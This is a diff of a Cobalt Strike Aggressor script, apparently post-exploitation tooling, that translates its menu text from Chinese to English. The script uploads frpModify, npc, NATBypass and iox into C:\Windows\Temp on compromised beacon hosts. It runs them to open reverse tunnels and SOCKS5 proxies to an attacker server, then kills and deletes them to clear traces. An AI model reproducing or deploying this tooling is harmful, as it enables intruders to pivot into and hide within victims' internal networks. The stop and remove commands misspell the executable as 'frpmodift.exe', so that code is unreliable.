@@ -1,11 +1,11 @@
-menu "内网穿透" {
-	menu "frpModify(无需frpc.ini落地)" {
-		item "上传frpc" {
+menu "Intranet penetration" {
+	menu "frpModify(No need to land on frpc.ini)" {
+		item "Upload frpc" {
 			$bid = $1;
-			$dialog = dialog("上传frpc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &frp_upload);
-			dialog_description($dialog,"frp指定参数版（无需frpc.ini落地）。项目地址：https://github.com/uknowsec/frpModify");
-			drow_text($dialog, "UploadPath",  "上传路径: ");
-			dbutton_action($dialog, "上传");
+			$dialog = dialog("Upload frpc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &frp_upload);
+			dialog_description($dialog,"frp specifies the parameter version (no need for frpc.ini landing). Project address：https://github.com/uknowsec/frpModify");
+			drow_text($dialog, "UploadPath",  "Upload path: ");
+			dbutton_action($dialog, "Upload");
 			dialog_show($dialog);
 		}
 		sub frp_upload {
@@ -16,13 +16,13 @@ menu "内网穿透" {
 				bupload($bid, script_resource("/scripts/Intranet agent/x86/frpmodify.exe"));
 			}
 		}
-		item "运行frpc"{
+		item "Run frpc"{
 			$bid = $1['@'];
-			$Dialog = dialog("运行frpc",%(ip => "x.x.x.x", port => "2333",bid => $bid),&frpc_run);
-			dialog_description($Dialog, "运行frpc，使用了frpModify，指定参数即可，socks5端口为23333。");
+			$Dialog = dialog("Run frpc",%(ip => "x.x.x.x", port => "2333",bid => $bid),&frpc_run);
+			dialog_description($Dialog, "Run frpc, use frpModify, specify the parameters, socks5 port is 23333.");
 			drow_text($Dialog, "ip", "ip: ");
 			drow_text($Dialog, "port", "port: ");
-			dbutton_action($Dialog, "运行");
+			dbutton_action($Dialog, "run");
 			dialog_show($Dialog);
 		}
 		sub frpc_run{
@@ -31,13 +31,13 @@ menu "内网穿透" {
 			$port = replace($3['port'], "\"", "");
 			bshell($bid, "frpmodify.exe -t  $+ $Name -p  $+ $port");
 		}
-		item "停止frpc"{
+		item "Stop frpc"{
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "taskkill -f /im frpmodift.exe");
 			}
 		}
-		item "删除frpc"{
+		item "Remove frpc"{
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "taskkill -f /im frpmodift.exe & del /f /s /q frpmodify.exe");
@@ -45,13 +45,13 @@ menu "内网穿透" {
 		}
 	}
 
-	menu "nps(无配置文件落地)" {
-		item "上传npc" {
+	menu "nps(No configuration file landing)" {
+		item "Upload npc" {
 			$bid = $1;
-			$dialog = dialog("上传npc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &npc_upload);
-			dialog_description($dialog,"一款轻量级、高性能、功能强大的内网穿透代理服务器。支持tcp、udp、socks5、http等几乎所有流量转发。使用参考：https://mp.weixin.qq.com/s/zI04_kxVFWdnegctAzNmmg。项目地址：https://github.com/ehang-io/nps");
-			drow_text($dialog, "UploadPath",  "上传路径: ");
-			dbutton_action($dialog, "上传");
+			$dialog = dialog("Upload npc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &npc_upload);
+			dialog_description($dialog,"A lightweight, high-performance, and powerful intranet penetration proxy server. Support almost all traffic forwarding such as tcp, udp, socks5, http. Use reference：https://mp.weixin.qq.com/s/zI04_kxVFWdnegctAzNmmg。项目地址：https://github.com/ehang-io/nps");
+			drow_text($dialog, "UploadPath",  "Upload path: ");
+			dbutton_action($dialog, "Upload");
 			dialog_show($dialog);
 		}
 		sub npc_upload {
@@ -59,13 +59,13 @@ menu "内网穿透" {
 			bcd($bid, $3['UploadPath']);
 			bupload($bid, script_resource("/scripts/Intranet agent/npc.exe"));
 		}
-		item "运行npc"{
+		item "Run npc"{
 			$bid = $1['@'];
-			$Dialog = dialog("运行npc",%(server => "ip:8024", vkey => "",bid => $bid),&npc_run);
-			dialog_description($Dialog, "运行npc，无配置文件落地，使用参考：https://mp.weixin.qq.com/s/zI04_kxVFWdnegctAzNmmg。");
+			$Dialog = dialog("Run npc",%(server => "ip:8024", vkey => "",bid => $bid),&npc_run);
+			dialog_description($Dialog, "Run npc，no configuration file landing, use reference：https://mp.weixin.qq.com/s/zI04_kxVFWdnegctAzNmmg。");
 			drow_text($Dialog, "server", "server: ");
 			drow_text($Dialog, "vkey", "vkey: ");
-			dbutton_action($Dialog, "运行");
+			dbutton_action($Dialog, "run");
 			dialog_show($Dialog);
 		}
 		sub npc_run{
@@ -74,13 +74,13 @@ menu "内网穿透" {
 			$vkey = replace($3['vkey'], "\"", "");
 			bshell($bid, "npc.exe -server= $+ $server -vkey= $+ $vkey");
 		}
-		item "停止npc"{
+		item "Stop npc"{
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "taskkill -f /im npc.exe");
 			}
 		}
-		item "删除npc"{
+		item "Remove npc"{
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "taskkill -f /im npc.exe & del /f /s /q npc.exe");
@@ -88,13 +88,13 @@ menu "内网穿透" {
 		}
 	}
 
-	menu "NATBypass(端口转发)" {
-		item "上传nb" {
+	menu "NATBypass(Port forwarding)" {
+		item "Upload nb" {
 			$bid = $1;
 			$dialog = dialog("上传nb", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &nb);
-			dialog_description($dialog,"一款lcx在golang下的实现。项目地址：https://github.com/cw1997/NATBypass");
-			drow_text($dialog, "UploadPath",  "上传路径: ");
-			dbutton_action($dialog, "上传");
+			dialog_description($dialog,"An implementation of lcx under golang. project address：https://github.com/cw1997/NATBypass");
+			drow_text($dialog, "UploadPath",  "Upload path: ");
+			dbutton_action($dialog, "Upload");
 			dialog_show($dialog);
 		}
 		sub nb {
@@ -105,13 +105,13 @@ menu "内网穿透" {
 				bupload($bid, script_resource("/scripts/Intranet agent/x86/nb.exe"));
 			}
 		}
-		item "运行nb"{
+		item "Run nb"{
 			$bid = $1['@'];
-			$Dialog = dialog("运行nb",%(lhost => "127.0.0.1:3389", rhost => "x.x.x.x:1997",bid => $bid),&nb_run);
-			dialog_description($Dialog, "vps运行：./nb -listen 1997 2017");
-			drow_text($Dialog, "lhost", "本地IP:Port ");
-			drow_text($Dialog, "rhost", "公网IP:Port ");
-			dbutton_action($Dialog, "运行");
+			$Dialog = dialog("Run nb",%(lhost => "127.0.0.1:3389", rhost => "x.x.x.x:1997",bid => $bid),&nb_run);
+			dialog_description($Dialog, "Vps run：./nb -listen 1997 2017");
+			drow_text($Dialog, "lhost", "Local IP:Port ");
+			drow_text($Dialog, "rhost", "Remote IP:Port ");
+			dbutton_action($Dialog, "run");
 			dialog_show($Dialog);
 		}
 		sub nb_run{
@@ -120,13 +120,13 @@ menu "内网穿透" {
 			$rhost = replace($3['rhost'], "\"", "");
 			bshell($bid, "nb.exe -slave  $+ $lhost  $+ $rhost");
 		}
-		item "停止nb"{
+		item "Stop nb"{
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "taskkill -f /im nb.exe");
 			}
 		}
-		item "删除nb"{
+		item "Delete nb"{
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "taskkill -f /im nb.exe & del /f /s /q nb.exe");
@@ -134,13 +134,13 @@ menu "内网穿透" {
 		}
 	}
 
-	menu "iox(端口转发与socks5)" {
-		item "上传iox" {
+	menu "iox(Port forwarding and socks5)" {
+		item "Upload iox" {
 			$bid = $1;
-			$dialog = dialog("上传iox", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &iox);
-			dialog_description($dialog,"端口转发工具和socks5代理。项目地址：https://github.com/EddieIvan01/iox");
-			drow_text($dialog, "UploadPath",  "上传路径: ");
-			dbutton_action($dialog, "上传");
+			$dialog = dialog("Upload iox", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &iox);
+			dialog_description($dialog,"Port forwarding tool and socks5 proxy. project address：https://github.com/EddieIvan01/iox");
+			drow_text($dialog, "UploadPath",  "Upload path: ");
+			dbutton_action($dialog, "Upload");
 			dialog_show($dialog);
 		}
 		sub iox {
@@ -151,14 +151,14 @@ menu "内网穿透" {
 				bupload($bid, script_resource("/scripts/Intranet agent/x86/iox.exe"));
 			}
 		}
-		item "运行iox(fwd)"{
+		item "Run iox(fwd)"{
 			$bid = $1['@'];
-			$Dialog = dialog("运行iox",%(lhost => "192.168.0.100:3389", rhost => "*x.x.x.x:3389", hex => "656565",bid => $bid),&iox_fwdrun);
-			dialog_description($Dialog, "vps运行：./iox fwd -l *3389 -l 33890 -k 656565");
-			drow_text($Dialog, "lhost", "本地IP:Port ");
-			drow_text($Dialog, "rhost", "公网IP:Port ");
-			drow_text($Dialog, "hex", "流量加密密钥: ");
-			dbutton_action($Dialog, "运行");
+			$Dialog = dialog("Run iox",%(lhost => "192.168.0.100:3389", rhost => "*x.x.x.x:3389", hex => "656565",bid => $bid),&iox_fwdrun);
+			dialog_description($Dialog, "vps run：./iox fwd -l *3389 -l 33890 -k 656565");
+			drow_text($Dialog, "lhost", "Local IP:Port ");
+			drow_text($Dialog, "rhost", "Public IP:Port ");
+			drow_text($Dialog, "hex", "Traffic encryption key: ");
+			dbutton_action($Dialog, "Run");
 			dialog_show($Dialog);
 		}
 		sub iox_fwdrun{
@@ -169,13 +169,13 @@ menu "内网穿透" {
 			bshell($bid, "iox.exe fwd -r  $+ $lhost -r  $+ $rhost -k  $+ $hex");
 		}
 
-		item "运行iox(proxy)"{
+		item "Run iox(proxy)"{
 			$bid = $1['@'];
-			$Dialog = dialog("运行iox",%(rhost => "*x.x.x.x:9999", hex => "000102",bid => $bid),&iox_proxyrun);
-			dialog_description($Dialog, "vps先建立服务：./iox proxy -l *9999 -l 1080 -k 000102");
-			drow_text($Dialog, "rhost", "公网IP:Port ");
-			drow_text($Dialog, "hex", "流量加密密钥: ");
-			dbutton_action($Dialog, "运行");
+			$Dialog = dialog("Run iox",%(rhost => "*x.x.x.x:9999", hex => "000102",bid => $bid),&iox_proxyrun);
+			dialog_description($Dialog, "Vps first establish service：./iox proxy -l *9999 -l 1080 -k 000102");
+			drow_text($Dialog, "rhost", "Public IP:Port ");
+			drow_text($Dialog, "hex", "Traffic encryption key: ");
+			dbutton_action($Dialog, "run");
 			dialog_show($Dialog);
 		}
 		sub iox_proxyrun{
@@ -185,13 +185,13 @@ menu "内网穿透" {
 			bshell($bid, "iox.exe proxy -r  $+ $rhost -k  $+ $hex");
 		}
 
-		item "停止iox"{
+		item "Stop iox"{
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "taskkill -f /im iox.exe");
 			}
 		}
-		item "删除iox"{
+		item "Remove iox"{
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "taskkill -f /im iox.exe & del /f /s /q iox.exe");
